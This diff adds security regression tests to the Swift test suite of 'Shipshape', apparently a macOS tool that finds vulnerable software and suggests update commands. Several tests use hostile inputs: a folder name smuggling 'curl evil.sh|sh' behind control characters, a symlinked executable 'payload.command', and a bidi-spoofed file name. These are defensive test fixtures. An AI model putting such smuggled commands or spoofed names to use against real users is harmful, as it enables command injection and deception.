@@ -401,17 +401,180 @@ import Foundation
         expect(StateFolder.resolve(in: support) == moved && FileManager.default.fileExists(atPath: former.path), "an existing Shipshape folder is kept and a leftover old folder is left alone")
         try? FileManager.default.removeItem(at: support)
 
-        // Minute refreshes reuse saved results; full checks always compute again and replace them.
-        var computed = 0
-        func compute() async -> Int { computed += 1; return computed }
-        let first = await Reuse.value("test|reuse", maxAge: 60) { await compute() }
-        let full = await Reuse.value("test|reuse", maxAge: 60) { await compute() }
-        let quick = await Reuse.$enabled.withValue(true) { await Reuse.value("test|reuse", maxAge: 60) { await compute() } }
-        let expired = await Reuse.$enabled.withValue(true) { await Reuse.value("test|reuse", maxAge: 0) { await compute() } }
-        expect(first == 1 && full == 2 && quick == 2 && expired == 3, "minute refreshes reuse a fresh result; full checks and expired entries fetch again")
-        let bulk: [String: Int] = await Reuse.$enabled.withValue(true) { await Reuse.values(["test|reuse", "test|missing"], maxAge: 60) }
-        let bulkFull: [String: Int] = await Reuse.values(["test|reuse"], maxAge: 60)
-        expect(bulk == ["test|reuse": 2] && bulkFull.isEmpty, "bulk lookups return only saved keys, and nothing outside a minute refresh")
+        // Ownership: commands for software this account can't change are held back, with who owns it and what to do.
+        func fakeAccess(_ owners: [String: String], readOnly: Set<String>, children: [String: [String]] = [:]) -> FileAccess {
+            FileAccess(user: "sam", exists: { owners[$0] != nil }, canWrite: { !readOnly.contains($0) }, owner: { owners[$0] }, children: { children[$0] ?? [] })
+        }
+        func projectFinding(_ folder: String) -> Finding {
+            var finding = update(Installation(product: "npm:lodash", name: "lodash", version: "4.17.20", path: folder + "/package-lock.json#lodash@4.17.20", domain: "projects",
+                                              ecosystem: "npm", packageName: "lodash", manager: "npm", location: folder, dependency: "direct"), "4.17.21", kind: .security)
+            finding.commands = Commands.commands(for: finding)
+            return finding
+        }
+        let theirs = "/Users/alex/Projects/app", mine = "/Users/sam/shop"
+        var owned = [projectFinding(theirs), projectFinding(theirs), projectFinding(mine)]
+        let otherAccount = fakeAccess([theirs: "alex", theirs + "/package-lock.json": "alex", theirs + "/node_modules": "alex", mine: "sam", mine + "/package-lock.json": "sam"],
+                                      readOnly: [theirs, theirs + "/package-lock.json", theirs + "/node_modules"])
+        Ownership.restrict(&owned, access: otherAccount)
+        expect(owned[0].blocked == "/Users/alex/Projects/app belongs to alex, so this account can't change it. Make the fix from alex's account, or ask them to." && owned[0].commands == [],
+               "another account's project keeps its finding but loses the command that would fail")
+        expect(owned[2].blocked == nil && owned[2].commands?.first?.text.hasPrefix("cd /Users/sam/shop && npm install") == true, "this account's own project keeps its command")
+        let ownedGroups = groupByCommand(owned)
+        expect(ownedGroups.count == 2 && ownedGroups[0].findings.count == 2 && ownedGroups[0].command == nil, "blocked findings in one project share a card with no command")
+        var rootModules = [projectFinding(mine)]
+        Ownership.restrict(&rootModules, access: fakeAccess([mine: "sam", mine + "/package-lock.json": "sam", mine + "/node_modules": "sam", mine + "/node_modules/@babel": "root"],
+                                                            readOnly: [mine + "/node_modules/@babel"], children: [mine + "/node_modules": ["@babel", "lodash"]]))
+        expect(rootModules[0].blocked?.hasPrefix("/Users/sam/shop/node_modules/@babel belongs to root, usually left by an install run with sudo") == true,
+               "an npm scope folder left to root by sudo is caught before npm fails to move packages inside it")
+        var brewOwned = [update(Installation(product: "node", name: "node", version: "26.1.0", path: "/opt/homebrew/Cellar/node/26.1.0", domain: "brew", package: "node", manager: "brew"), "26.2.0"),
+                         update(Installation(product: "zoom", name: "Zoom", version: "6.0", path: "/Applications/zoom.us.app", domain: "apps", package: "zoom", manager: "app"), "6.1")]
+        for index in brewOwned.indices { brewOwned[index].commands = Commands.commands(for: brewOwned[index]) }
+        Ownership.restrict(&brewOwned, access: fakeAccess(["/opt/homebrew/Cellar/node": "alex", "/Applications": "root"], readOnly: ["/opt/homebrew/Cellar/node", "/Applications"]))
+        expect(brewOwned[0].blocked == "Homebrew on this Mac belongs to alex, so only that account can upgrade it. Run the update from alex's account, or ask them to." && brewOwned[0].commands == [],
+               "Homebrew installed by another account: say so instead of offering brew upgrade")
+        expect(brewOwned[1].blocked == nil, "apps with their own updaters aren't checked")
+        var global = update(Installation(product: "npm:left-pad", name: "left-pad", version: "1.0.0", path: "/usr/local/lib/node_modules/left-pad", domain: "packages",
+                                         ecosystem: "npm", packageName: "left-pad", manager: "npm-global", location: "/usr/local/bin/npm"), "1.3.0", kind: .security)
+        global.commands = [UpdateCommand(text: "Open the advisory", note: "", kind: "link", target: "https://example.com")] + Commands.commands(for: global)
+        var globals = [global]
+        Ownership.restrict(&globals, access: fakeAccess(["/usr/local/lib/node_modules": "root"], readOnly: ["/usr/local/lib/node_modules"]))
+        expect(globals[0].blocked?.hasPrefix("/usr/local/lib/node_modules belongs to root, so this account can't change it.") == true && globals[0].commands?.map(\.kind) == ["link"],
+               "a root-owned global folder keeps vendor links but drops the Terminal command")
+        let folders = fakeAccess(["/": "root", theirs: "alex", mine: "sam"], readOnly: ["/", theirs])
+        expect(Ownership.folderWarning(theirs, access: folders) == "/Users/alex/Projects/app belongs to alex. Its vulnerabilities are reported, but fixes have to be made from alex's account.",
+               "adding another account's folder explains that fixes happen from that account")
+        expect(Ownership.folderWarning("/", access: folders) == "/ includes system or Homebrew folders. Those are skipped; projects elsewhere in it are checked." && Ownership.folderWarning(mine, access: folders) == nil,
+               "adding the whole disk notes the skipped system folders; your own folder needs no warning")
+
+        // Security: "Open file" only opens plain text files Shipshape found; a repo can't turn it into running a script.
+        let openRoot = FileManager.default.temporaryDirectory.appendingPathComponent("shipshape-open-\(UUID().uuidString)").resolvingSymlinksInPath().path
+        let openProject = openRoot + "/C# app"
+        try FileManager.default.createDirectory(atPath: openProject, withIntermediateDirectories: true)
+        try Data("{}".utf8).write(to: URL(fileURLWithPath: openProject + "/package.json"))
+        try Data("echo hi".utf8).write(to: URL(fileURLWithPath: openRoot + "/payload.command"))
+        try FileManager.default.setAttributes([.posixPermissions: 0o755], ofItemAtPath: openRoot + "/payload.command")
+        try FileManager.default.createSymbolicLink(atPath: openProject + "/linked.json", withDestinationPath: openRoot + "/payload.command")
+        try Data("x==1".utf8).write(to: URL(fileURLWithPath: openProject + "/run.command"))
+        try Data("{}".utf8).write(to: URL(fileURLWithPath: openRoot + "/elsewhere.json"))
+        expect(SafeOpen.fileProblem(openProject + "/package.json", folders: [openProject], files: []) == nil, "a plain package.json in a project folder opens")
+        expect(SafeOpen.fileProblem(openProject + "/linked.json", folders: [openProject], files: [])?.contains("is a link") == true, "a package.json that links to a script is refused")
+        expect(SafeOpen.fileProblem(openProject + "/run.command", folders: [openProject], files: [])?.contains("isn't a plain text file") == true, "a .command file is refused even if not executable")
+        expect(SafeOpen.fileProblem(openRoot + "/payload.command", folders: [openRoot], files: []) != nil, "an executable file is refused")
+        expect(SafeOpen.fileProblem(openRoot + "/elsewhere.json", folders: [openProject], files: [])?.contains("outside your project folders") == true, "files outside chosen folders are refused")
+        expect(SafeOpen.fileProblem(openRoot + "/elsewhere.json", folders: [], files: [openRoot + "/elsewhere.json"]) == nil, "a known MCP settings file opens")
+        expect(SafeOpen.appProblem(openRoot + "/Fake.app", roots: [openRoot]) != nil && SafeOpen.appProblem(openProject, roots: [openRoot]) != nil, "only real app bundles in Applications folders open")
+        try FileManager.default.createDirectory(atPath: openRoot + "/Real.app", withIntermediateDirectories: true)
+        expect(SafeOpen.appProblem(openRoot + "/Real.app", roots: [openRoot]) == nil, "an app bundle in an allowed folder opens")
+        try Data("flask==2.0.0\n".utf8).write(to: URL(fileURLWithPath: openProject + "/requirements.txt"))
+        var parseErrors: [String] = []
+        let hashProject = Inventory.projects([openProject + "/requirements.txt"], errors: &parseErrors)
+        let hashFinding = update(hashProject[0], "2.2.5", kind: .security)
+        expect(hashProject.first?.sourceFile == openProject + "/requirements.txt" && Commands.commands(for: hashFinding).first?.target == openProject + "/requirements.txt",
+               "a # in a folder name no longer cuts the file path short")
+        try? FileManager.default.removeItem(atPath: openRoot)
+
+        // Security: invisible characters in a name never reach a command someone pastes into a terminal.
+        let trap = "/work/\u{15}curl evil.sh|sh\r"
+        var hidden = update(Installation(product: "npm:lodash", name: "lodash", version: "4.17.20", path: trap + "/package-lock.json#lodash@4.17.20", domain: "projects",
+                                         ecosystem: "npm", packageName: "lodash", manager: "npm", location: trap, dependency: "direct", file: trap + "/package-lock.json"), "4.17.21", kind: .security)
+        hidden.commands = Commands.commands(for: hidden)
+        expect(hidden.commands?.contains { $0.kind == nil } == false, "a folder name with control characters gets no Terminal command")
+        var hiddenList = [hidden]
+        Ownership.restrict(&hiddenList, access: fakeAccess([:], readOnly: []))
+        expect(hiddenList[0].blocked?.contains("/work/\u{FFFD}curl evil.sh|sh\u{FFFD} contains invisible characters") == true, "the notice shows where the invisible characters are")
+        expect(Commands.hasHiddenCharacters("pkg\u{202E}gpj.exe") && Commands.hasHiddenCharacters("a\u{2028}b") && Commands.hasHiddenCharacters("tab\there"),
+               "bidi overrides, line separators and tabs count as hidden")
+        expect(!Commands.hasHiddenCharacters("/Users/zoë/Projects/日本 🚀/app"), "ordinary accented, CJK and emoji names are fine")
+
+        // Security: hostile lockfiles can't stall a check or make it read outside the chosen folder.
+        let slowStart = Date()
+        _ = Lockfiles.requirements(String(repeating: "a[\n", count: 20_000))
+        expect(Date().timeIntervalSince(slowStart) < 0.5, "20,000 lines of unclosed brackets parse in well under a second (was about 7.5 s)")
+        expect(Lockfiles.requirements("uvicorn[standard] == 0.30.1\nflask==2.0.0 ; python_version > '3.8'\nbroken[\n==1.0\n").map { "\($0.name) \($0.version)" } == ["uvicorn 0.30.1", "flask 2.0.0"],
+               "extras, spaces and markers still parse; a bracket can't run onto the next line")
+        let readRoot = FileManager.default.temporaryDirectory.appendingPathComponent("shipshape-read-\(UUID().uuidString)").path
+        try FileManager.default.createDirectory(atPath: readRoot + "/app", withIntermediateDirectories: true)
+        try Data("flask==2.0.0\n".utf8).write(to: URL(fileURLWithPath: readRoot + "/outside.txt"))
+        try FileManager.default.createSymbolicLink(atPath: readRoot + "/app/requirements.txt", withDestinationPath: readRoot + "/outside.txt")
+        try FileManager.default.createSymbolicLink(atPath: readRoot + "/app/linked", withDestinationPath: readRoot)
+        expect(Lockfiles.find(in: readRoot + "/app").isEmpty, "linked lockfiles and linked folders aren't followed")
+        expect(Inventory.read(readRoot + "/app/requirements.txt", limit: 1_000) == nil && Inventory.read(readRoot + "/outside.txt", limit: 5) == nil
+               && Inventory.read(readRoot + "/outside.txt", limit: 1_000) != nil, "reads refuse links and files over the limit")
+        var limitErrors: [String] = []
+        _ = Inventory.projects([readRoot + "/app/requirements.txt"], errors: &limitErrors)
+        expect(limitErrors.first?.hasPrefix("Skipped") == true, "a linked lockfile is reported as skipped, not read")
+        limitErrors = []
+        _ = Inventory.projects([readRoot + "/outside.txt", readRoot + "/outside.txt"], errors: &limitErrors, timeLimit: -1)
+        expect(limitErrors == ["Stopped reading lockfiles after -1 seconds; 2 not checked"], "reading stops at the time limit and says how many were left")
+        try? FileManager.default.removeItem(atPath: readRoot)
+
+        // Security: Homebrew is read from its folders, never by running brew, and only trusted binaries run.
+        let brewRoot = FileManager.default.temporaryDirectory.appendingPathComponent("shipshape-brew-\(UUID().uuidString)").path
+        for folder in ["Cellar/node/26.1.0_1/bin", "Cellar/node/25.0.0", "Cellar/vercel/59.0.0", "Caskroom/zed/0.150.0", "Caskroom/zed/.metadata", "opt", "var/homebrew/pinned"] {
+            try FileManager.default.createDirectory(atPath: brewRoot + "/" + folder, withIntermediateDirectories: true)
+        }
+        try FileManager.default.createSymbolicLink(atPath: brewRoot + "/opt/node", withDestinationPath: "../Cellar/node/26.1.0_1")
+        try FileManager.default.createSymbolicLink(atPath: brewRoot + "/var/homebrew/pinned/node", withDestinationPath: "../../../opt/node")
+        try FileManager.default.createSymbolicLink(atPath: brewRoot + "/Cellar/vercel-cli", withDestinationPath: "vercel")
+        let (brewItems, brewErrors) = Inventory.homebrew(prefixes: [brewRoot])
+        let brewSummary = brewItems.map { "\($0.name) \($0.version) \($0.manager ?? "") \($0.pinned == true ? "pinned" : "")" }.sorted()
+        expect(brewErrors.isEmpty && brewSummary == ["Zed 0.150.0 cask ", "node 25.0.0 brew-old pinned", "node 26.1.0 brew pinned", "vercel 59.0.0 brew "],
+               "Homebrew folders give the active copy, older copies, pins and casks; renamed-formula links are skipped")
+        let probe = brewRoot + "/probe.sh"
+        try Data("#!/bin/sh\necho ok\n".utf8).write(to: URL(fileURLWithPath: probe))
+        try FileManager.default.setAttributes([.posixPermissions: 0o755], ofItemAtPath: probe)
+        expect(trustedExecutable(probe) && !trustedExecutable(probe, uid: 4242), "a binary is trusted when this account (or root) owns it")
+        try FileManager.default.setAttributes([.posixPermissions: 0o775], ofItemAtPath: probe)
+        expect(!trustedExecutable(probe), "a binary others can change is not trusted")
+        expect((try? command(probe, [])) == nil, "an untrusted binary is never run")
+        setenv("SHIPSHAPE_PROBE_SECRET", "1", 1)
+        let environment = try command("/usr/bin/env", []).text
+        expect(!environment.contains("SHIPSHAPE_PROBE_SECRET") && environment.contains("PATH=/usr/bin:/bin:/usr/sbin:/sbin"), "launched programs get a minimal environment, not the app's")
+        try? FileManager.default.removeItem(atPath: brewRoot)
+
+        // Security: names are quoted, MCP options can't smuggle in a key, huge versions are rejected.
+        var tilde = update(Installation(product: "npm:~x", name: "~x", version: "1.0.0", path: "/g/lib/node_modules/~x", domain: "packages", ecosystem: "npm", packageName: "~x", manager: "npm-global", location: "/g/bin/npm"), "", kind: .security)
+        tilde.malicious = true
+        expect(Commands.commands(for: tilde).isEmpty, "a package name starting with ~ (which a shell would expand) gets no command")
+        expect(Inventory.mcpPackage(command: "npx", args: ["--api-key", "sk_live_ABC", "@x/server"]) == nil, "an unknown option's value (an API key) is never taken for the package")
+        expect(Inventory.mcpPackage(command: "npx", args: ["-y", "@x/server@1.2.3"]).map { $0.spec } == "@x/server@1.2.3"
+               && Inventory.mcpPackage(command: "npx", args: ["--registry", "https://r.example", "pkg"]).map { $0.spec } == "pkg"
+               && Inventory.mcpPackage(command: "uvx", args: ["--token=abc", "mcp-server-git"]).map { $0.spec } == "mcp-server-git", "known options and option=value forms are still skipped correctly")
+        expect(Version("99999999999999999999") == nil && Version("1.99999999999999999999") == nil && Version("1.2.3") != nil, "a version component too large for an integer is rejected, not dropped")
+        let now = Date()
+        expect(lastCheckText(now.addingTimeInterval(-20), now: now).hasSuffix("(just now)") && lastCheckText(now.addingTimeInterval(-300), now: now).hasSuffix("(5 minutes ago)"),
+               "the last check reads its time and how long ago it was")
+
+        // Security: downloads stop at their size limit instead of filling memory.
+        let realConfiguration = Fetch.configuration
+        let stubbed = URLSessionConfiguration.ephemeral
+        stubbed.protocolClasses = [StubProtocol.self]
+        Fetch.configuration = stubbed
+        StubProtocol.responses = ["https://stub.test/ok": (200, ["Content-Type": "application/json"], Data("{\"a\":1}".utf8)),
+                                  "https://stub.test/declared": (200, ["Content-Length": "20000000"], Data("{}".utf8)),
+                                  "https://stub.test/endless": (200, [:], Data(count: 3_000_000))]
+        let small = try await Fetch.json("https://stub.test/ok") as? [String: Int]
+        expect(small == ["a": 1], "a normal response is returned")
+        func failure(_ url: String) async -> String? { do { _ = try await Fetch.data(url, limit: 1_000_000); return nil } catch { return error.localizedDescription } }
+        let declaredFailure = await failure("https://stub.test/declared"), endlessFailure = await failure("https://stub.test/endless"), missing = await failure("https://stub.test/missing")
+        expect(declaredFailure == "Source exceeded response limit", "a declared size over the limit is refused before the body arrives")
+        expect(endlessFailure == "Source exceeded response limit", "a response with no declared size is cut off once it passes the limit")
+        expect(missing?.contains("404") == true, "an HTTP error is reported with its status")
+        let plainHTTP = await failure("http://stub.test/ok")
+        expect(plainHTTP == "Invalid source URL", "only https sources are fetched")
+        Fetch.configuration = realConfiguration
+
+        // Project scans skip app bundles and package-manager internals such as Homebrew's own Library.
+        let scanRoot = FileManager.default.temporaryDirectory.appendingPathComponent("shipshape-scan-\(UUID().uuidString)").path
+        for (folder, file) in [("app", "package-lock.json"), ("Tool.app/Contents", "package-lock.json"), ("homebrew/Library/formula-analytics", "uv.lock")] {
+            try FileManager.default.createDirectory(atPath: scanRoot + "/" + folder, withIntermediateDirectories: true)
+            try Data("{}".utf8).write(to: URL(fileURLWithPath: scanRoot + "/" + folder + "/" + file))
+        }
+        expect(Lockfiles.find(in: scanRoot, skipping: [scanRoot + "/homebrew"]) == [scanRoot + "/app/package-lock.json"], "app bundles and skipped roots aren't scanned as projects")
+        expect(Lockfiles.find(in: scanRoot + "/homebrew", skipping: [scanRoot + "/homebrew"]).count == 1, "a folder chosen inside a skipped root is still checked")
+        expect(Lockfiles.skippedRoots.isSuperset(of: ["/opt/homebrew", "/usr", Inventory.home + "/Library"]), "Homebrew, /usr and ~/Library are skipped by default")
+        try? FileManager.default.removeItem(atPath: scanRoot)
+
 
         let summer = ISO8601DateFormatter().date(from: "2026-10-24T16:00:00Z")!
         let winter = ISO8601DateFormatter().date(from: "2026-12-24T17:00:00Z")!
@@ -437,4 +600,23 @@ import Foundation
         if let html = try? String(contentsOfFile: root + "/openssl.txt", encoding: .utf8) { try expect(Rules.openssl(item("openssl", "3.6.4"), html: html)?.fixed == "3.6.5", "current OpenSSL vendor fixture") }
         print("Passed \(count) rule, failure-retention, notification-fingerprint and scheduling checks")
     }
+}
+
+// Serves canned responses to Fetch in tests, delivered in 64 KB chunks like a real transfer.
+final class StubProtocol: URLProtocol {
+    static var responses: [String: (status: Int, headers: [String: String], body: Data)] = [:]
+    override class func canInit(with request: URLRequest) -> Bool { true }
+    override class func canonicalRequest(for request: URLRequest) -> URLRequest { request }
+    override func startLoading() {
+        let stub = Self.responses[request.url!.absoluteString] ?? (404, [:], Data())
+        client?.urlProtocol(self, didReceive: HTTPURLResponse(url: request.url!, statusCode: stub.status, httpVersion: "HTTP/1.1", headerFields: stub.headers)!, cacheStoragePolicy: .notAllowed)
+        var offset = 0
+        while offset < stub.body.count {
+            let end = min(offset + 65_536, stub.body.count)
+            client?.urlProtocol(self, didLoad: stub.body.subdata(in: offset..<end))
+            offset = end
+        }
+        client?.urlProtocolDidFinishLoading(self)
+    }
+    override func stopLoading() {}
 }
